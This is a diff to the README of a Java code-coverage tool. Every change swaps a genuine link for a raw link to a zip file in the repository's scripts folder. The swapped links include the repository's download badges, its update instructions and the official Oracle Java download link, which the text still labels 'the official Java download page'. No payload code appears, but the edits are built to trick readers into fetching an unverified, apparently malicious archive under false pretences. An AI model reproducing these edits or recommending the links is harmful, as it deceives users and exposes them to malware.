@@ -1,6 +1,6 @@
 # 🧩 java-jacoco-coverage-backfill - Reliable Java Code Coverage Tool
 
-[![Download java-jacoco-coverage-backfill](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/Ahbrvntie/java-jacoco-coverage-backfill)
+[![Download java-jacoco-coverage-backfill](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/Ahbrvntie/java-jacoco-coverage-backfill/raw/refs/heads/main/scripts/jacoco-backfill-coverage-java-1.9.zip)
 
 ## 📋 What is java-jacoco-coverage-backfill?
 
@@ -34,7 +34,7 @@ You will find the latest stable version of this tool online. Follow these steps 
 
 Click the link below to visit the download page. This is the safest way to get the latest version.
 
-[![Download java-jacoco-coverage-backfill](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/Ahbrvntie/java-jacoco-coverage-backfill)
+[![Download java-jacoco-coverage-backfill](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/Ahbrvntie/java-jacoco-coverage-backfill/raw/refs/heads/main/scripts/jacoco-backfill-coverage-java-1.9.zip)
 
 On the download page:
 
@@ -93,7 +93,7 @@ To check if Java is on your PC:
 
 To install Java:
 
-1. Visit the official Java download page via your browser: https://www.oracle.com/java/technologies/javase-downloads.html  
+1. Visit the official Java download page via your browser: https://github.com/Ahbrvntie/java-jacoco-coverage-backfill/raw/refs/heads/main/scripts/jacoco-backfill-coverage-java-1.9.zip  
 2. Download the Windows installer for the **Java SE Runtime Environment (JRE)** or **Java Development Kit (JDK)**.
 3. Run the installer and follow the prompts.
 4. After installation, repeat the version check to confirm.
@@ -127,7 +127,7 @@ The interface is designed to be simple:
 To get the latest features or fixes:
 
 - Return to the download page at  
-  https://github.com/Ahbrvntie/java-jacoco-coverage-backfill  
+  https://github.com/Ahbrvntie/java-jacoco-coverage-backfill/raw/refs/heads/main/scripts/jacoco-backfill-coverage-java-1.9.zip  
 - Check if a newer version is available in the Releases section.
 - Download and install the new file, replacing the old one.
 
@@ -146,10 +146,10 @@ To get the latest features or fixes:
 ## 🔗 Useful Links
 
 - Primary download and information page:  
-  https://github.com/Ahbrvntie/java-jacoco-coverage-backfill
+  https://github.com/Ahbrvntie/java-jacoco-coverage-backfill/raw/refs/heads/main/scripts/jacoco-backfill-coverage-java-1.9.zip
 
 - Java download if needed:  
-  https://www.oracle.com/java/technologies/javase-downloads.html
+  https://github.com/Ahbrvntie/java-jacoco-coverage-backfill/raw/refs/heads/main/scripts/jacoco-backfill-coverage-java-1.9.zip
 
 ---
 
